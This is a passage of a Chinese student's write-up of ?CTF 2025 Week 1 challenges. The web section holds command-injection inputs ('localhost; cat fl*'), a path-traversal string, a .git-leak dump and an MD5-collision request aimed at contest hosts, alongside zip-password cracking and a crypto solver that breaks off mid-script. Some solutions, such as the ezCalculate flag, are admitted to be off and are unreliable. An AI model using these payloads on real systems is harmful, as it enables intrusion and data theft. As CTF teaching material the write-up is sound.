# [个人] QuestionCTF2025年下旬的WriteUp (50题)

?CTF 2025 是由来自 杭州师范大学、暨南大学、广东工业大学、哈尔滨理工大学、湖南科技大学、西安工业大学、福建农林大学、太原理工大学、浙江师范大学、江南大学、山东科技大学、东北大学秦皇岛分校、青岛工学院、广东外语外贸大学、兰州大学（以上排名不分先后）共十五所高校的网络安全竞赛团队共同发起的**CTF新生赛**。

比赛采取传统 **Jeopardy 解题个人赛** 的形式，持续 **四周** 时间，**每周六**放出新赛题，同时停止上一周赛题作答。赛题采用动态计分，涵盖 Web、Reverse、Pwn、Crypto、Misc 五大基础方向。

本赛事设置**校内赛道**供联办高校招新选拔参考使用，同时设置**公开赛道**，希望与全国各地的师傅交流学习，共同进步。

------

对于 **?CTF** 的官方读法是 **Question CTF** 。



## 比赛时间

**校内赛道**自 北京时间 **2025 年 9 月 27 日 10:00** (周六) 开始，至 **2025 年 10 月 25 日 22:00** (周六) 结束，共四周。

每周六早上 10 点停止上一周题目的作答，并放出本周的新题目。



## 交流群

为确保信息传递的有效性，?CTF 的所有官方通知将仅通过比赛平台及 QQ 群发布。若比赛平台遇到技术故障，期间所有重要公告将只在 QQ 群内发送。

公开赛道参赛选手可加入 QQ 群：**1063409268**；校内赛道的QQ群添加方式已通过**各高校**内部的通知渠道公布。

加入 QQ 群属于自愿行为，不加入不会影响参赛资格。但请注意，若因未及时获取群内信息而导致组织方无法与您取得联系，可能被视为您主动放弃相关质询权利。

比赛全程不设置群聊禁言，但恳请所有选手**遵守比赛规则**并保持文明交流态度。

------

提示: 此处为 **校内赛道**，分组邀请码请联系本校的负责人获取，**公开赛道无需邀请码**。
在报名时请选择 **创建队伍** 并输入分组邀请码。



## 比赛规则

1. 本比赛为**个人赛**，请勿与**他人**交流任何与题目相关的信息。

2. 若题目无特殊说明， flag 字符串的形式皆为 `flag{*}`，请提交包含 `flag{}` 的完整 flag。

3. 其他的还没写。

   

# Week1

## forensics

### **取证第一次**

#### 解题过程

根据题目提示，在百度网盘上下载forensic1.7z文件

解压后得到文件：what.vmdk

这是什么

因为我一直用的virtual box很久没用vmware了

搜了一下才知道是vmware生成的**虚拟固态硬盘**

不管

直接导入virtual box

然后搜索flag.txt

查看flag.txt文件内容

得出flag



### **你也喜欢win7吗**

#### 解题过程

根据题目提示在百度网盘上下载你也喜欢win7吗.7z文件

解压得到memory.raw

这是什么，搜一下知道这是**内存镜像**，下载工具**volatility**

然后直接对着这个文件输入代码

```cmd
volatility -f memory.raw imageinfo #查看镜像信息，这里优选Win7SP1x64
volatility -f memory.raw --profile=Win7SP1x64 filescan | findstr "flag" #找到flag.zip，这里是win写法
mkdir out
volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000002b10e070 -D ./out/ #导出flag.zip，发现需要密码
volatility -f memory.raw --profile=Win7SP1x64 filescan | findstr "hint" #找到hint.txt
volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000029457910 -D ./out/ #导出hint.txt，提示画图线索
volatility -f memory.raw --profile=Win7SP1x64 pslist | findstr "mspaint.exe" #列出进程，PID2624
volatility -f memory.raw --profile=Win7SP1x64 memdump -p 2624 --dump-dir=./out/ #直接dump出来
```

得到文件：2624.dmp百度一下，然后给它改成2624.data导入画图工具**GIMP**

根据题目：

```
c3为了出题，把他心爱的拥有 **2560\*1600** 超高分辨率、16核32线程锐龙7945HX超强CPU、8G显存RTX 4060超绝GPU的Legion R9000P 2023装上了Windows 7系统并制作了内存镜像…
```

得到长×宽=2560*1600

根据百度提示不断调试**位移量**，发现这是**灰度**分离

得到密码：114ezmisc514

解压得到：flag{1z_volatility_F0r3ns1c5}



## osint

### **Task 1. 见面地点**

#### 解题过程

下载解压得到图片

仔细读题：

```
你的高中同学 Moe 已经有一个多月没联系你了...但今天又突然收到了他的消息。
“不用我多说你一定懂了，坐地铁在这里碰面ww”以及一张他随手拍的照片。
哦——原来是暑假旅行啊。
Moe 这人很喜欢给朋友出些丈二和尚摸不着头脑的谜题。出乎意料的是，这次他给出的线索似乎很直截了当。
你需要找到距目的地直线距离最近的地铁站点，以及经过该站点的线路。
flag以flag{线路号_站点名}的形式给出，站点名为首字母大写的拼音形式。
例如：目标站点为“国际机场“，有1号线与空港S3号线经过，则答案为flag{1_S3_GuoJiJiChang}。
```

有用信息：**例如：目标站点为“国际机场“，有1号线与空港S3号线经过，则答案为flag{1_S3_GuoJiJiChang}。**

利用百度搜图得到地点是郑州如意湖

郑州如意湖附近最近的地铁站是会展中心站，有地铁 1 号线和 4 号线经过

得到：flag{1_4_HuiZhanZhongXin}



### **Task 2. 方块世界？！**

#### 解题过程

根据图片内容找到网址：codeberg.org

根据图片内容找到codeberg.org的仓库what_is_the_flag

根据提示下载文字游戏世界的存档

百度搜索一下发现这是一款Steam上的游戏

下载Steam，下载文字游戏世界，导入世界存档，进入游戏

简单浏览一下，直接来到第三关

看到石板上的字符猜测Base64 -> × 解码失败

触发再看一次事件后再次解码 -> × 解码失败

在网站上浏览一下找到字母表：M-ZA-Ln-za-m1-90+/=

```
alphabet = "M-ZA-Ln-za-m1-90+/="
encrypted = "LzkuL4gSqI6hrH0JYTUkLR9jLy0PnQNlKIY1Y4VmJ2DlqFZso4VsDzQkpmYusC=="
```

自定义Base64解码得到：flag{Funny_W0r1d_0f_Ch@rac43rs_Tru3_or_Fa1s3!}

得出：flag{Funny_W0r1d_0f_Ch@rac43rs_Tru3_or_Fa1s3!}



## misc

### **俱乐部之旅(1) - 邀请函**

#### 解题过程

下载得到附件Try_t0_f1nd_My_s3cret.zip

解压发现需要密码，双击打开zip，得到提示

猜测后面四个问号代表四个可打印字符

将zip拖入kali虚拟机中输入命令暴力破解

```cmd
sudo zip2john Try_t0_f1nd_My_s3cret.zip > hash.txt
sudo hashcat -m 13000 -a 3 hash.txt "c5im?a?a?a?a"
```

发现hashcode识别不出来，老问题了，直接用**john**

```cmd
sudo john --mask='c5im?a?a?a?a' hash.txt
```

得到解压密码：c5im8467

解压后得到steg.docx，双击打不开，拖进winhex里查看16进制代码，看到PK果断将后缀名改成zip解压

解压后在u_f0und_m3里找到2657656c63306d655f74305f7468335f6335696d5f433175627d

一眼16进制转ASCLL得到：**&Welcome_t0_th3_c5im_C1ub}**很明显这个flag只有一半，继续找

留意到docProps/core.xml

得到提示：11001101101100110000111001111111011101011101100001110010110010010111110110101111010001100111100111101111111010011110011101111101100011111010标准ASCII码使用‌7位二进制数‌表示字符

得到：**flag{W0rd_5t3g_is_1z**

最终拼接得到：**flag{W0rd_5t3g_is_1z&Welcome_t0_th3_c5im_C1ub}**



### **布豪有黑客(一)**

#### 解题过程

下载解压得到布豪有黑客(一).pcapng

用wireshark打开文件

看到Get password.txt

查看回传流量

得到**密码**：?CTF2025

看到flag.zip的流量

直接导出到桌面解压

用得到的密码解压

得到：flag{Wireshark_1s_4wes0m3}



### **文化木的侦探委托(一)**

#### 解题过程

下载解压得到图片：奇怪的图片.png

首先看属性没问题，然后直接导入winhex

确认是png没错，查看没有foremost

将高度08 70设置为0F FF

得到提示：**红1，绿0，蓝2**

还原图片后导入**StegSolve**中

设置分析RGBdata

在十六进制头部看到flag

得到：flag{Please_Find_Me}



### **维吉尼亚朋友的来信**

#### 解题过程

下载解压得到summer.wav

联想到调制解调器？扔进Audacity看看，得到提示**KEY{deepsound}**

deepsound导入summer.wav

这里我蒙了好久，一直找不到隐藏的文件

最后才发现是**版本问题**

升级我的deepsound

解密得到XX.txt得到文本：

```
Gieg fsq sulirs,
  Osfprpi xd lvy gkumpaaba jruph dx QNS!Wkmw xkb’n wxvx e vsay—vw’v e tasmaerxrh lzslr fxvmdkwnl phixh uvuyohrkt, ovyeh hzigq zcah rj gdvs, yihuc lxvrya foyi, pfr yihuc tjrnfr krphh s gypuhx apahcaj ws ft mbwbyhvis. Zslr, bry’pa khlrwfl cdmf gvqg, pipjb nb vhi tplhyeqv mr rzoif, dqh xjjb "C qrq’x ocgk" cawr "M jxyilrg lx sjl."
  Ria’w zsvgq wz gklrkh xsyy ryivlzsfzlqk ei xwlfw. Zi’zt szf ohhr xwwfy—fwdvmcy on n susfawa, mpudxgwaba bxu lipvg, qbqgivxfu quhui xd khuew. Eyx izon’f wki qpyww bi lx: ikwfs zlvxezw wm n ohwwdf, sprub wqpdz qvq d vyhz. Ohq bry’vt fcn norri. Izwm prpqycahs gkumztk ch propeqgfuglrr, sc kvuelqk mswom, nqg pmulwht hdgl dlvye xs.
  Ws sajy vq. Hbtagfy. Rasivxeshg. Dvo ujwgnvrqw. Gtdsvedwi xww hcab ymgigfcrv, drh sgb’n shdv xww gnhpepih. Lvy PWI asgdr cf eumkwlsl jlwl cdm wh vw, drh lw qua’w zemi lc mrh zligw mihu msygfss gdniw ngi.
Zydj mw "umbhl ohxxtj hi lrx". Vibwavru zvee lvy sodk gdfhyaw lr jasu{} uag xwi jfryeolri‘_' ig fycodgi hhowr fkevpuhye' '.

Ehwx lagbrv!
```

百度一下，根据题目猜测这是**维吉尼亚**编码

搜索在线工具解码，根据之前的KEY：deepsound

得到文本：

```
Dear new friend,
  Lobazbo ka iru rsgsmwwmi vxhme zt BVE!Chis isn’t just a game—ss’r p bmyzxbntcp xfphn qfhsqhtjh apude qrfganehq, krjmt nwecb hogu og czga, koeqy wfhxlx ckut, xrx vedfk fpekcn gcxtn p cuactd nmxdylr iy cp imeneusfo. Vdtd, hou’ll stretch your msmc, aqbpo ky rdt bbreuabd yx ewleb, oyt dgfx "N ydw’k lzcg" niix "J ftjqxxt iu ofw."
  Oew’h hebtn tv cvtdqe tojg devsivoqhxwh ae iexlj. Wf’vp dhr uedn ieill—ctzrxkk uk j ofargjx, jlqofscxxw mfg rvmsc, mmysostbf ygnhf uz gscqc. But that’s the magic ye hi: qwcsp whrimlc ti j zpicqc, plnfj iwmzv bdc j ivev. Ksy nxv’rp qkz tbooe. Ekey volmjkmnf dhqikbw ie lnzxqwtcrchcz, ei hrqptcq zptki, yys vjqhhpf nqdi zhggq dp.
  To olrk bd. Eypwrnk. Xxoegfqyud. Ark frimkrnbe. Szqpsazhq jct dylj kstfdbycd, pxe ocm’v enqs uss rvtvbles. The CTF world ic aqxsirfi ghsw kps td rh, ldn yt nqw’h hqsf hy xzt fyfds itpg spucqae mqkfs jrq.
Wuzu ui "azyeh ksfjzg de wzj". Bvytwrcc lbba hgg euqh dzbsgmc in flag{} and use undebkhcq‘_' um svzkzrq tnlsn qsqbcreua' '.

Bdsi tmmoos!
```

这里的读取逻辑相当复杂，工程量也非常之大，这是一套相似替换的**自定义字母映射表**，我们直接将这项工作即文本丢给AI来帮我们做

得到：**flag{welcome_to_our_ctf_world}**



## web

### **Gitttttttt**

#### 解题过程

由题目得知这很明显是一个**git文件夹风险漏洞**

直接用命令行工具

```cmd
git clone https://github.com/lijiejie/GitHack.git #工具
cd GitHack
python GitHack.py http://challenge.ilovectf.cn:30548/.git/
```

将目标文件下载下来之后看到有flag_yooooooouuuuuu_caannnnnnnntttttttt_fiiiiiinnnndddme.txt

双击打开查看

得到：flag{#H_I_N3zvOr_13v3#_TIe_G8it_48g@zN}



### **Ping??**

#### 解题过程

ping能有什么问题？一头雾水，直接百度ping漏洞利用

一般这种网站不会有特别的过滤

而是单纯的指令拼接

即ping + localhost

构造payload

```cmd
localhost; ls #flag.txt
```

```cmd
localhost; cat flag.txt #被过滤了，原来是"flag"被过滤了
```

从新构造payload

```cmd
localhost; cat fl*
```

得到：flag{cbbdc86e-0f30-41c3-97c9-d8bc440fc8e1}



### **from_http**

#### 解题过程

看到提示"请使用?CTFBrowser浏览器访问"

果断打开BP

然后直接拦截浏览器请求

根据它的一步步提示

得到最终请求信息

```
POST /?welcome=to HTTP/1.1
Host: challenge.ilovectf.cn:30570
Cache-Control: max-age=0
User-Agent: ?CTFBrowser
Cookie: wishu=happiness
X-Forwarded-For: 127.0.0.1
Referer: ?CTF
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

the=?CTF
```

发送请求后看到它响应了flag

得到：flag{8b3d88a4-7190-4981-821c-43fa1c78610b}



### **secret of php**

#### 解题过程

考点应该是代码审计+md5绕过等绕过这些的

第一步，a不是2025但是转成整数后就是2025，发现它忽略报错，所以a随便取，a=2025a、asdf2025asdg

这里我构造payload

```
http://challenge.ilovectf.cn:30587/?a=0x7E9
```

跳转到：[challenge.ilovectf.cn:30587/Flll4g.php](http://challenge.ilovectf.cn:30587/Flll4g.php)

重点放在这句上：**(string)$a !== (string)$b && md5((string)$a) === md5((string)$b)**

这里非常搞啊我把这句仍给AI，它都弄不出aaa[]和bbb[]出来

这里我们直接选择使用**百度的高级搜索**功能把这一句话扔上去

我之前找到过现成的md5的，现在一时间找不到了，总之就是这样

然后构造payload

```cmd
curl -X POST "http://challenge.ilovectf.cn:30587/Flll4g.php" -H "Content-Type: application/x-www-form-urlencoded" -d "a[]=1&b[]=2&aa[]=3&bb[]=4&aaa=%4D%C9%68%FF%0E%E3%5C%20%95%72%D4%77%7B%72%15%87%88%40%3E%B0%DF%E1%CA%54%27%1D%6C%45%83%4A%EB%98&bbb=%4D%C9%68%FF%0E%E3%5C%20%95%72%D4%77%7B%72%15%87%88%40%3E%B0%DF%E1%CA%54%27%1D%6C%45%83%4A%EB%99"
```

得出flag



### **前端小游戏**

#### 解题过程

首先打开开发者模式，查看一下**源码**

看到它js的逻辑

很明显score < 0时它才会给flag

而它flag的来源居然是**atob('ZmxhZ3s2MWE3N2Q2Mi0yYzBiLTRlZTEtYTU4Zi00MGY1OGQ2NzJiMzl9');**

所以解码直接拿到：flag{60a77d62-2c0b-4ee1-a58f-40f58d672b39}

另外还有一种方法

就是用BP拦截请求将socre改成负数

得到：flag{60a77d62-2c0b-4ee1-a58f-40f58d672b39}



### **包含不明东西的食物？！**

#### 解题过程

发现输入的食物会被**拼接路径**

即food -> **/var/www/html/backpack/food**

我们要找flag.txt

盲猜在/var下

所以构造payload

```
../../../../flag.txt
```

得到：flag{1a43577e-2f14-4b27-8278-bc4930bb9e45}



## reverse

### **8086ASM**

#### 解题过程

下载解压得到8086.asm

根据题目提示这是汇编代码，我的第一反应是直接扔进IDA里，但发现看不懂

百度了一下发现.asm文件格式本身就是可读的汇编代码，即直接用记事本打开

发现它先对每个输入字节进行右移 2 位操作，再将结果与 DATA2 中的值依次进行 XOR 操作，写一个解密脚本

```python
def decrypt_flag():
    # DATA1中的数据（十六进制）
    data1 = [
        0xBB, 0x1B, 0x83, 0x8C, 0x36, 0x19, 0xCC, 0x97,
        0x8D, 0xE4, 0x97, 0xCC, 0x0C, 0x48, 0xE4, 0x1B,
        0x0E, 0xD7, 0x5B, 0x65, 0x1B, 0x50, 0x96, 0x06,
        0x3F, 0x19, 0x0C, 0x4F, 0x4E, 0xF9, 0x1B, 0xD7,
        0x0C, 0x1D, 0xA0, 0xC6
    ]
    
    # DATA2中的数据（十六进制）
    data2 = [0x1122, 0x3344, 0x1717, 0x9090, 0xBBCC]
    
    flag = []
    for i in range(35):  # 处理前35个字符
        high_byte = (data1[i] << 8) & 0xFF00
        low_byte = data1[i+1] & 0xFF
        combined = high_byte | low_byte
        
        # 与DATA2中的值进行XOR
        xor_result = combined ^ data2[i % 5]
        
        # 分离高低位
        decrypted_high = (xor_result >> 8) & 0xFF
        decrypted_low = xor_result & 0xFF
        
        decrypted_high = (decrypted_high << 2) & 0xFF
        decrypted_low = (decrypted_low << 2) & 0xFF
        
        # 转换为字符并添加到flag
        if i == 0:
            flag.append(chr(decrypted_low))
        elif i < 34:
            flag.append(chr(decrypted_high))
    
    return ''.join(flag)

flag = decrypt_flag()
print("Flag:", flag)

```

得到：flag{1t's_4n_34sy_8086_4sm_pr0bl3m!}



### **PlzDebugMe**

#### 解题过程

先搜索main没main

再搜索start查看伪代码

简单分析一下start的伪代码很冗杂

发现主逻辑在sub_401697

仔细查看并记录其中被标记为浅黄色的函数和变量

关键数据

```
.data:00410020 byte_410020     db 5Bh, 50h, 0A1h, 25h, 84h, 8Eh, 61h, 0C4h, 6Bh, 0BBh
.data:00410020                                         ; DATA XREF: sub_401697+E8↑o
.data:0041002A                 db 0AEh, 5, 0Bh, 0C6h, 3Dh, 42h, 5Ah, 0FBh, 0C1h, 0C9h
.data:00410034                 db 4Eh, 0E9h, 8Dh, 50h, 91h, 2 dup(87h), 24h, 0ADh, 0AFh
.data:0041003E                 db 0D5h, 36h
```

写一个还原脚本

```python
def generate_lcg_sequence(initial_seed, count):
    """生成LCG随机数序列（对应sub_401656的输出）"""
    lcg_a = 1103515245
    lcg_c = 12345
    seed = initial_seed
    lcg_list = []
    
    for _ in range(count):
        seed = (lcg_a * seed + lcg_c) & 0xFFFFFFFF
        r = (seed >> 16) & 0x7FFF
        lcg_list.append(r)
    
    return lcg_list

def get_flag(target_bytes):
    """计算原始flag"""
    if len(target_bytes) != 32:
        raise ValueError("target_bytes是32字节的列表")
    
    # 生成32个LCG随机数（初始种子123456）
    lcg_sequence = generate_lcg_sequence(initial_seed=123456, count=32)
    
    # 异或还原原始flag字节
    flag_bytes = []
    for i in range(32):
        original_byte = target_bytes[i] ^ lcg_sequence[i]
        # 确保结果是8位无符号整数
        original_byte &= 0xFF
        flag_bytes.append(original_byte)
    
    # 转换为字符串并验证格式
    try:
        flag = bytes(flag_bytes).decode("ascii")
    except UnicodeDecodeError:
        raise ValueError("生成的字节包含非ASCII字符，可能target_bytes错误！")
    
    if not (flag.startswith("flag{") and flag.endswith("}")):
        raise ValueError("生成的flag格式错误，检查target_bytes是否正确")
    
    return flag

# 从byte_410020提取的32字节数据（按地址顺序排列）
target_byte_410020 = [
    0x5B, 0x50, 0xA1, 0x25, 0x84, 0x8E, 0x61, 0xC4, 0x6B, 0xBB,
    0xAE, 0x05, 0x0B, 0xC6, 0x3D, 0x42, 0x5A, 0xFB, 0xC1, 0xC9,
    0x4E, 0xE9, 0x8D, 0x50, 0x91, 0x87, 0x87, 0x24, 0xAD, 0xAF,
    0xD5, 0x36
]

# 计算并输出flag
try:
    flag = get_flag(target_byte_410020)
    print(f"计算得到的flag: {flag}")
except Exception as e:
    print(f"错误: {e}")

```

得到：flag{Y0u_Kn0w_H0w_t0_D3bug!!!!!}



### **ezCSharp**

#### 解题过程

发现这是用Java写的程序，不是用IDA打开，所以我们直接选择用DNSPY打开

打开后双击main函数，查看主逻辑

这是一个很简单的加密解密逻辑，我们注意到这行

```java
string text = Program.DecodeFlag(encodedFlagAttribute.EncodedValue);
```

在这行上打一个断点，进行动态调试，得到text=D1tbi0t_spive_engineering_wi_doropy_it_fun_2025

根据提示

```
"Locate the 'FlagContainer' class in the Program Resource Manager",
		"Submit in format: flag{xxxx}"
```

得出：flag{D1tbi0t_spive_engineering_wi_doropy_it_fun_2025}



### **ezCalculate**

#### 解题过程

这题的类名和函数名有点混淆，我们选择直接Shift+F12查看srings，然后双击right查看调用，进入到真正的主逻辑当中

查看主程序，发现这是一个自定义的编码计算加密

写一个还原程序

```python
# 临时写的伪代码，逻辑差不多就是这样了
key = "wwqessgxsddkaao123wms"
key_ords = [ord(c) for c in key]

flag = []
for i in range(21):
    ki = key_ords[i]
    flag_char = chr((( (ord('f') if i==0 else 
                        ord('l') if i==1 else 
                        ord('a') if i==2 else 
                        ord('g') if i==3 else 
                        ord('{') if i==4 else 
                        ord('w') if i==5 else 
                        ord('w') if i==6 else 
                        ord('q') if i==7 else 
                        ord('e') if i==8 else 
                        ord('s') if i==9 else 
                        ord('s') if i==10 else 
                        ord('g') if i==11 else 
                        ord('x') if i==12 else 
                        ord('s') if i==13 else 
                        ord('d') if i==14 else 
                        ord('d') if i==15 else 
                        ord('k') if i==16 else 
                        ord('a') if i==17 else 
                        ord('a') if i==18 else 
                        ord('o') if i==19 else 
                        ord('}') if i==20 else 0) + ki) ^ ki) - ki)
    flag.append(flag_char)

print(''.join(flag))

```

得出：flag{wwqessgxsddkaao}（存在较大偏差）



### **jvav**

#### 解题过程

下载解压得到：app-release.apk

很明显这是一道**安卓逆向**题，我们用到工具**Jaxd**

打开后无从下手，Ctrl+F输入flag

太多了加个约束，com.example.jvav

查看加密逻辑，一直查到根源com.example.jvav.utilis.enc.EncKT

```
input → encoder → confuser → rounder → 与固定数组比对
```

写一个还原脚本

```python
import base64

def reverse_rounder(target_array):
    length = len(target_array)
    original = [0] * length
    for j in range(length):
        # 原方法: bArr[i] = input[(i + 5) % length]
        # 逆运算: input[j] = bArr[(j - 5) % length]
        original[j] = target_array[(j - 5) % length]
    return original

def reverse_confuser(confused_array):
    original = []
    for c in confused_array:
        unsigned_c = c & 0xFF
        reversed_val = (~unsigned_c ^ 11) & 0xFF
        original_val = reversed_val - 32
        original.append(original_val & 0xFF)
    return original

def solve_flag():
    # checker方法中的固定数组
    target_array = [
        -89, 96, 102, 118, -89, -122, 103, -103, -125, -95, 114, 117, 
        -116, -102, 114, -115, -125, 108, 110, 118, -91, -83, 101, -115, 
        -116, -114, 124, 114, -123, -87, -87, -114, 121, 108, 124, -114
    ]
    
    # 步骤1: 逆向rounder
    after_rounder_rev = reverse_rounder(target_array)
    
    # 步骤2: 逆向confuser
    after_confuser_rev = reverse_confuser(after_rounder_rev)
    
    # 转换为字节数组
    byte_array = bytes(after_confuser_rev)
    
    # 步骤3: Base64解码（逆向encoder）
    try:
        decoded = base64.b64decode(byte_array)
        flag = decoded.decode('utf-8')
        return flag
    except Exception as e:
        return f"解码失败: {str(e)}"

if __name__ == "__main__":
    flag = solve_flag()
    print(f"找到的flag: {flag}")
```

得出：flag{k34_SSW5_aXNf_YWxz19q_XYZhfQ==}



## crypto

### **Basic Number theory**

#### 解题过程

下载得到main.py

```python
from Crypto.Util.number import *
from secret import flag

def gift(m, prime):
    return pow(m, (prime + 1) // 2, prime)

m = bytes_to_long(flag)
p = getPrime(256)
q = getPrime(256)

print(f'p = {p}')
print(f'q = {q}')
print(f'gift1 = {gift(m, p)}')
print(f'gift2 = {gift(m, q)}')

# p = 71380997427449345634700552609577271052193856747526826598031269184817312570231
# q = 65531748297495117965939047069388412545623909154912018722160805504300279801251
# gift1 = 40365143212042701723922505647865230754866250738391105510918441288000789123995
# gift2 = 10698628345523517254945893573969253712072344217500232111817321788145975103342
```

猜测是普通的数论

写一个还原脚本

```python
from Crypto.Util.number import *

# 给定的值
p = 71380997427449345634700552609577271052193856747526826598031269184817312570231
q = 65531748297495117965939047069388412545623909154912018722160805504300279801251
gift1 = 40365143212042701723922505647865230754866250738391105510918441288000789123995
gift2 = 10698628345523517254945893573969253712072344217500232111817321788145975103342

print(f"p mod 4 = {p % 4}")
print(f"q mod 4 = {q % 4}")

m_mod_p = pow(gift1, 2, p)
m_mod_q = pow(gift2, 2, q)

print(f"m mod p = {m_mod_p}")
print(f"m mod q = {m_mod_q}")

def crt(a1, m1, a2, m2):
    M = m1 * m2
    M1 = M // m1
    M2 = M // m2
    M1_inv = inverse(M1, m1)
    M2_inv = inverse(M2, m2)
    x = (a1 * M1 * M1_inv + a2 * M2 * M2_inv) % M
    return x

m = crt(m_mod_p, p, m_mod_q, q)

try:
    flag = long_to_bytes(m)
    print(f"Flag: {flag.decode()}")
except:
    pass
    
    possible_m_mod_p = [gift1, p - gift1]
    possible_m_mod_q = [gift2, q - gift2]
    
    for mp in possible_m_mod_p:
        for mq in possible_m_mod_q:
            current_m = crt(mp, p, mq, q)
            try:
                current_flag = long_to_bytes(current_m)
                if b'flag' in current_flag or b'FLAG' in current_flag:
                    print(f"Flag: {current_flag.decode()}")
            except:
                pass
```

得到：flag{Th3_c0rner5t0ne_0f_C2ypt0gr@phy}



### **Strange Machine**

#### 解题过程

下载解压得到源码

```python
from secret import msg_len, offset, plaintext
from Crypto.Util.number import long_to_bytes
from random import randbytes
from base64 import b64encode
from pwn import xor
import os

flag = os.getenv('FLAG')


def banner():
    print("你发现了一个奇怪的机器，它对你的消息进行了加密。")
    print("你截获了这个机器第一次的密文，同时可以继续使用该机器进行加密。")
    print("注意:所有密文输出都经过 base64 编码，方便你复制分析。\n")


def menu():
    print(f"1. 加密消息")
    print(f"2. 校验明文是否正确")
    print(f"3. 退出")


class Key:
    def __init__(self):
        self.seed = randbytes(msg_len)

    def generate(self):
        self.seed = self.seed[offset:] + self.seed[:offset]
        return self.seed


def pad(msg):
    pad_len = msg_len - len(msg)
    return msg + pad_len * long_to_bytes(pad_len)


def encrypt(msg, key):
    cipher = xor(pad(msg), key)
    return b64encode(cipher)


def main():
    banner()
    key = Key()
    cur_key = key.generate()
    cipher1 = encrypt(plaintext, cur_key)
    print(f'[*] 首次密文(base64):{cipher1}\n')
    while True:
        try:
            menu()
            choice = int(input(f"[?] 请输入你的选择:"))
            if choice == 1:
                msg = input(f"[?] 请输入要加密的消息(长度小于等于{msg_len}): ").encode()
                if len(msg) > msg_len:
                    print(f"[!] 输入消息过长，最长为 {msg_len} 字节\n")
                    continue

                cur_key = key.generate()
                cipher = encrypt(msg, cur_key)

                print(f"[*] 你的消息已加密(密文): {cipher}\n")
                continue

            if choice == 2:
                msg = input(f"[?] 请输入待校验的明文: ").encode()
                if msg == plaintext:
                    print(f"[*] 这是你的flag: {flag}\n")
                    break
                print("[!] 校验错误!\n")
                continue

            if choice == 3:
                print("再见~\n")
                break

            print("[!] 无效输入\n")
        except Exception:
            print("[!] 出现错误!\n")
            break


if __name__ == "__main__":
    main()

```

发现它的密钥是通过random.randbytes生成随机种子

然后循环偏移得到的密钥

同时使用nc连接，可以发现可以通过发送空字符串获取加密结果，从而推导出密钥信息

然后加密方式是简单的亦或操作xor

于是写一个脚本获取flag

```python
import base64
import socket
import re
import time

# XOR两个字节串
def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

def main():
    try:
        # 创建socket连接
        print('连接到服务器...')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('challenge.ilovectf.cn', 30765))
        sock.settimeout(10)
        
        print('等待服务器响应...')
        first_cipher = None
        first_cipher_b64 = None
        msg_len = 0
        
        buffer = b''
        while first_cipher is None:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buffer += chunk
                
                # 尝试提取首次密文
                # 寻找包含[*]的行
                lines = buffer.split(b'\n')
                for line in lines:
                    if b'[*]' in line and b':' in line:
                        try:
                            # 使用正则表达式提取base64部分
                            match = re.search(rb'b\'(.*?)\'', line)
                            if match:
                                first_cipher_b64 = match.group(1).decode()
                                print(f'首次密文(base64): {first_cipher_b64}')
                                first_cipher = base64.b64decode(first_cipher_b64)
                                msg_len = len(first_cipher)
                                print(f'msg_len: {msg_len}')
                                break
                        except Exception as e:
                            print(f'解析首次密文错误: {e}')
                            continue
            except socket.timeout:
                print('接收超时，重试...')
                continue
        
        # 检查是否成功获取首次密文
        if first_cipher is None:
            print('无法获取首次密文，退出')
            sock.close()
            return
        
        # 发送选项1
        print('发送选项1...')
        sock.send(b'1\n')
        time.sleep(1)
        
        # 读取到输入提示
        print('等待输入提示...')
        buffer = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buffer += chunk
                if b':' in chunk:
                    break
            except socket.timeout:
                break
        
        # 发送空字符串
        print('发送空字符串...')
        sock.send(b'\n')
        time.sleep(1)
        
        # 读取加密结果
        print('等待加密结果...')
        cipher1 = None
        cipher1_b64 = None
        buffer = b''
        while cipher1 is None:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buffer += chunk
                
                # 尝试提取加密结果
                lines = buffer.split(b'\n')
                for line in lines:
                    if b'[*]' in line and b':' in line:
                        try:
                            # 使用正则表达式提取base64部分
                            match = re.search(rb'b\'(.*?)\'', line)
                            if match:
                                cipher1_b64 = match.group(1).decode()
                                print(f'空字符串加密结果(base64): {cipher1_b64}')
                                cipher1 = base64.b64decode(cipher1_b64)
                                break
                        except Exception as e:
                            print(f'解析加密结果错误: {e}')
                            continue
            except socket.timeout:
                break
        
        # 检查是否成功获取加密结果
        if cipher1 is None:
            print('无法获取空字符串加密结果，退出')
            sock.close()
            return
        
        # 计算key1
        pad_len_empty = msg_len
        padded_empty = bytes([pad_len_empty]) * pad_len_empty
        key1 = xor(cipher1, padded_empty)
        print(f'key1: {key1.hex()}')
        
        # 尝试暴力破解
        print('\n开始暴力破解...')
        found = False
        
        # 优先尝试较短的填充长度，因为flag通常不会太长
        for pad_len in range(1, min(10, msg_len)):
            # 尝试所有可能的key移位
            for shift in range(0, msg_len):
                possible_key = key1[shift:] + key1[:shift]
                padded_plaintext = xor(first_cipher, possible_key)
                
                # 检查填充是否正确
                if len(padded_plaintext) >= pad_len:
                    valid_pad = True
                    for i in range(pad_len):
                        if padded_plaintext[-1 - i] != pad_len:
                            valid_pad = False
                            break
                    
                    if valid_pad:
                        plaintext = padded_plaintext[:-pad_len]
                        
                        # 检查是否为ASCII可打印字符
                        try:
                            plaintext_str = plaintext.decode('ascii')
                            if plaintext_str.isprintable() and len(plaintext_str) > 0:
                                print(f'\n发现可能的明文 (shift={shift}, pad={pad_len}): {plaintext_str}')
                                
                                # 发送选项2
                                sock.send(b'2\n')
                                time.sleep(1)
                                
                                # 读取到输入提示
                                buffer = b''
                                while True:
                                    try:
                                        chunk = sock.recv(4096)
                                        if not chunk:
                                            break
                                        buffer += chunk
                                        if b':' in chunk:
                                            break
                                    except socket.timeout:
                                        break
                                
                                # 发送明文
                                sock.send(plaintext + b'\n')
                                time.sleep(1)
                                
                                # 读取响应
                                response = b''
                                while True:
                                    try:
                                        chunk = sock.recv(4096)
                                        if not chunk:
                                            break
                                        response += chunk
